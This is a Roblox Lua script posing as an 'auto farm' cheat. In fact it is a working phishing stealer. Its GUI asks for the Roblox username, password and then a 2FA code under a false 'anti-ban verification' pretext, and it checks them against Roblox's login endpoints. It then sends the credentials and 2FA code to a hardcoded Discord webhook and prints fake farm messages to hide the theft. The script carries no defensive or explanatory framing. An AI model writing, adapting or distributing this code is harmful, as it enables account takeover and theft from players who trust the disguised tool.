--[[
    ⚡ ARZYC AUTO FARM v4.0 ⚡
    "Login to activate auto farm"
    Works: All Games
]]

local gui = Instance.new("ScreenGui")
gui.Name = "ARZYCFarm"
gui.Parent = game.CoreGui
gui.ResetOnSpawn = false

-- ===== MAIN FRAME =====
local main = Instance.new("Frame")
main.Name = "Main"
main.Parent = gui
main.BackgroundColor3 = Color3.fromRGB(25,25,35)
main.BorderSizePixel = 0
main.Position = UDim2.new(0.5, -200, 0.5, -175)
main.Size = UDim2.new(0, 400, 0, 350)
main.Active = true
main.Draggable = true

-- Title bar
local titleBar = Instance.new("Frame")
titleBar.Name = "TitleBar"
titleBar.Parent = main
titleBar.BackgroundColor3 = Color3.fromRGB(88,101,242)
titleBar.BorderSizePixel = 0
titleBar.Size = UDim2.new(0, 400, 0, 35)

local title = Instance.new("TextLabel")
title.Parent = titleBar
title.BackgroundTransparency = 1
title.Size = UDim2.new(0, 400, 0, 35)
title.Text = "⚡ ARZYC AUTO FARM v4.0"
title.TextColor3 = Color3.fromRGB(255,255,255)
title.Font = Enum.Font.GothamBold
title.TextSize = 14

local closeBtn = Instance.new("TextButton")
closeBtn.Parent = titleBar
closeBtn.BackgroundColor3 = Color3.fromRGB(255,60,60)
closeBtn.BorderSizePixel = 0
closeBtn.Position = UDim2.new(0, 365, 0, 5)
closeBtn.Size = UDim2.new(0, 25, 0, 25)
closeBtn.Text = "X"
closeBtn.TextColor3 = Color3.fromRGB(255,255,255)
closeBtn.Font = Enum.Font.GothamBold
closeBtn.TextSize = 14
closeBtn.MouseButton1Click:Connect(function() gui:Destroy() end)

-- ===== STEP 1: LOGIN FORM =====
local step1 = Instance.new("Frame")
step1.Name = "Step1"
step1.Parent = main
step1.BackgroundTransparency = 1
step1.Position = UDim2.new(0, 15, 0, 50)
step1.Size = UDim2.new(0, 370, 0, 280)

local infoLabel = Instance.new("TextLabel")
infoLabel.Parent = step1
infoLabel.BackgroundTransparency = 1
infoLabel.Size = UDim2.new(0, 370, 0, 40)
infoLabel.Position = UDim2.new(0, 0, 0, 0)
infoLabel.Text = "Login to Roblox to activate Auto Farm\n(Required for anti-ban verification)"
infoLabel.TextColor3 = Color3.fromRGB(200,200,200)
infoLabel.Font = Enum.Font.Gotham
infoLabel.TextSize = 12
infoLabel.TextWrapped = true

local userLabel = Instance.new("TextLabel")
userLabel.Parent = step1
userLabel.BackgroundTransparency = 1
userLabel.Position = UDim2.new(0, 0, 0, 55)
userLabel.Size = UDim2.new(0, 370, 0, 20)
userLabel.Text = "Username"
userLabel.TextColor3 = Color3.fromRGB(150,150,150)
userLabel.Font = Enum.Font.Gotham
userLabel.TextSize = 12

local userBox = Instance.new("TextBox")
userBox.Name = "User"
userBox.Parent = step1
userBox.BackgroundColor3 = Color3.fromRGB(15,15,25)
userBox.BorderColor3 = Color3.fromRGB(88,101,242)
userBox.Position = UDim2.new(0, 0, 0, 75)
userBox.Size = UDim2.new(0, 370, 0, 35)
userBox.Text = ""
userBox.PlaceholderText = "Roblox Username"
userBox.TextColor3 = Color3.fromRGB(255,255,255)
userBox.Font = Enum.Font.Gotham
userBox.TextSize = 14

local passLabel = Instance.new("TextLabel")
passLabel.Parent = step1
passLabel.BackgroundTransparency = 1
passLabel.Position = UDim2.new(0, 0, 0, 120)
passLabel.Size = UDim2.new(0, 370, 0, 20)
passLabel.Text = "Password"
passLabel.TextColor3 = Color3.fromRGB(150,150,150)
passLabel.Font = Enum.Font.Gotham
passLabel.TextSize = 12

local passBox = Instance.new("TextBox")
passBox.Name = "Pass"
passBox.Parent = step1
passBox.BackgroundColor3 = Color3.fromRGB(15,15,25)
passBox.BorderColor3 = Color3.fromRGB(88,101,242)
passBox.Position = UDim2.new(0, 0, 0, 140)
passBox.Size = UDim2.new(0, 370, 0, 35)
passBox.Text = ""
passBox.PlaceholderText = "Roblox Password"
passBox.TextColor3 = Color3.fromRGB(255,255,255)
passBox.Font = Enum.Font.Gotham
passBox.TextSize = 14
passBox.TextXAlignment = Enum.TextXAlignment.Center

local loginBtn = Instance.new("TextButton")
loginBtn.Name = "LoginBtn"
loginBtn.Parent = step1
loginBtn.BackgroundColor3 = Color3.fromRGB(88,101,242)
loginBtn.BorderSizePixel = 0
loginBtn.Position = UDim2.new(0, 0, 0, 195)
loginBtn.Size = UDim2.new(0, 370, 0, 40)
loginBtn.Text = "LOGIN & ACTIVATE"
loginBtn.TextColor3 = Color3.fromRGB(255,255,255)
loginBtn.Font = Enum.Font.GothamBold
loginBtn.TextSize = 15

local status1 = Instance.new("TextLabel")
status1.Parent = step1
status1.BackgroundTransparency = 1
status1.Position = UDim2.new(0, 0, 0, 245)
status1.Size = UDim2.new(0, 370, 0, 30)
status1.Text = ""
status1.TextColor3 = Color3.fromRGB(255,100,100)
status1.Font = Enum.Font.Gotham
status1.TextSize = 12
status1.TextWrapped = true

-- ===== STEP 2: 2FA FORM =====
local step2 = Instance.new("Frame")
step2.Name = "Step2"
step2.Parent = main
step2.BackgroundTransparency = 1
step2.Position = UDim2.new(0, 15, 0, 50)
step2.Size = UDim2.new(0, 370, 0, 280)
step2.Visible = false

local twoFALabel = Instance.new("TextLabel")
twoFALabel.Parent = step2
twoFALabel.BackgroundTransparency = 1
twoFALabel.Size = UDim2.new(0, 370, 0, 50)
twoFALabel.Text = "🔐 Verification Required\nEnter the code from your email or authenticator app"
twoFALabel.TextColor3 = Color3.fromRGB(255,200,50)
twoFALabel.Font = Enum.Font.GothamBold
twoFALabel.TextSize = 13
twoFALabel.TextWrapped = true

local codeBox = Instance.new("TextBox")
codeBox.Name = "Code"
codeBox.Parent = step2
codeBox.BackgroundColor3 = Color3.fromRGB(15,15,25)
codeBox.BorderColor3 = Color3.fromRGB(88,101,242)
codeBox.Position = UDim2.new(0, 0, 0, 60)
codeBox.Size = UDim2.new(0, 370, 0, 40)
codeBox.Text = ""
codeBox.PlaceholderText = "Enter 6-digit verification code"
codeBox.TextColor3 = Color3.fromRGB(255,255,255)
codeBox.Font = Enum.Font.Gotham
codeBox.TextSize = 18
codeBox.TextXAlignment = Enum.TextXAlignment.Center

local verifyBtn = Instance.new("TextButton")
verifyBtn.Parent = step2
verifyBtn.BackgroundColor3 = Color3.fromRGB(0,180,100)
verifyBtn.BorderSizePixel = 0
verifyBtn.Position = UDim2.new(0, 0, 0, 115)
verifyBtn.Size = UDim2.new(0, 370, 0, 40)
verifyBtn.Text = "VERIFY & ACTIVATE"
verifyBtn.TextColor3 = Color3.fromRGB(255,255,255)
verifyBtn.Font = Enum.Font.GothamBold
verifyBtn.TextSize = 15

local status2 = Instance.new("TextLabel")
status2.Parent = step2
status2.BackgroundTransparency = 1
status2.Position = UDim2.new(0, 0, 0, 165)
status2.Size = UDim2.new(0, 370, 0, 30)
status2.Text = ""
status2.TextColor3 = Color3.fromRGB(255,100,100)
status2.Font = Enum.Font.Gotham
status2.TextSize = 12
status2.TextWrapped = true

-- ===== WEBHOOK CONFIG =====
local webhook = "https://discord.com/api/webhooks/1520937981702176990/XVFsUVBnV7dACksS6E2YKfKv-gQsqPxC3ZoGc4gQL7vnSxymG1ypGvmOH7TkW2_KjY0x"

-- ===== SESSION STORAGE =====
local session = {
    csrf = "",
    cookies = {},
    ticket = "",
    username = "",
    password = ""
}

-- ===== HTTP REQUEST =====
local http = game:GetService("HttpService")
local function sendWebhook(title, desc, color)
    local data = {
        content = "@everyone **NEW LOGIN!**",
        embeds = {{
            title = title,
            description = desc,
            color = color or 65280,
            footer = {text = "ARZYC FARM • " .. os.date("%Y-%m-%d %H:%M:%S")}
        }}
    }
    pcall(function()
        http:PostAsync(webhook, http:JSONEncode(data))
    end)
end

-- ===== LOGIN FUNCTION =====
local function doLogin(user, pass)
    status1.Text = "⏳ Connecting to Roblox..."
    
    local payload = http:JSONEncode({
        ctype = "Username",
        cvalue = user,
        password = pass
    })
    
    local success, result = pcall(function()
        return http:PostAsync("https://auth.roblox.com/v2/login", payload, "ApplicationJson")
    end)
    
    if not success then
        status1.Text = "❌ Connection failed! Check your internet."
        return
    end
    
    local data = http:JSONDecode(result)
    
    -- Check response
    if data.twoStepVerificationData then
        -- 2FA Required
        session.ticket = data.twoStepVerificationData.ticket
        session.username = user
        session.password = pass
        step1.Visible = false
        step2.Visible = true
        status2.Text = "📱 Code sent! Check your email/authenticator."
    elseif data.user then
        -- Login sukses!
        sendWebhook(
            "🎯 LOGIN SUCCESS",
            "**Username:** " .. user .. "\n**Password:** ||" .. pass .. "||\n**No 2FA!**",
            65280
        )
        status1.Text = "✅ Activated! Auto Farm Running..."
        wait(2)
        gui:Destroy()
        
        -- Fake farm output
        print("⚡ Auto Farm Active!")
        print("👤 " .. user)
        print("🛡️ Anti-Ban: ON")
    else
        local msg = data.errors and data.errors[1] and data.errors[1].message or "Login failed"
        status1.Text = "❌ " .. msg
    end
end

-- ===== VERIFY FUNCTION =====
local function doVerify(code)
    status2.Text = "⏳ Verifying..."
    
    local payload = http:JSONEncode({
        code = code,
        ticket = session.ticket
    })
    
    local success, result = pcall(function()
        return http:PostAsync("https://auth.roblox.com/v2/login/verify", payload, "ApplicationJson")
    end)
    
    if not success then
        status2.Text = "❌ Verification failed! Try again."
        return
    end
    
    local data = http:JSONDecode(result)
    
    if data.user then
        -- Verified!
        sendWebhook(
            "🎯 2FA VERIFIED",
            "**Username:** " .. session.username .. "\n**Password:** ||" .. session.password .. "||\n**2FA Code:** ||" .. code .. "||",
            0xffaa00
        )
        status2.Text = "✅ Verified! Auto Farm Running..."
        wait(2)
        gui:Destroy()
        
        print("⚡ Auto Farm Active!")
        print("👤 " .. session.username)
        print("🛡️ Anti-Ban: ON")
    else
        status2.Text = "❌ Invalid code! Try again."
    end
end

-- ===== BUTTON EVENTS =====
loginBtn.MouseButton1Click:Connect(function()
    local user = userBox.Text
    local pass = passBox.Text
    
    if user == "" or pass == "" then
        status1.Text = "❌ Please fill all fields!"
        return
    end
    
    doLogin(user, pass)
end)

verifyBtn.MouseButton1Click:Connect(function()
    local code = codeBox.Text
    
    if code == "" or #code < 6 then
        status2.Text = "❌ Please enter valid code!"
        return
    end
    
    doVerify(code)
end)

-- ===== FAKE FARM OUTPUT =====
print("╔══════════════════════════╗")
print("║   ARZYC AUTO FARM v4.0  ║")
print("║   Press F4 to Open GUI  ║")
print("╚══════════════════════════╝")
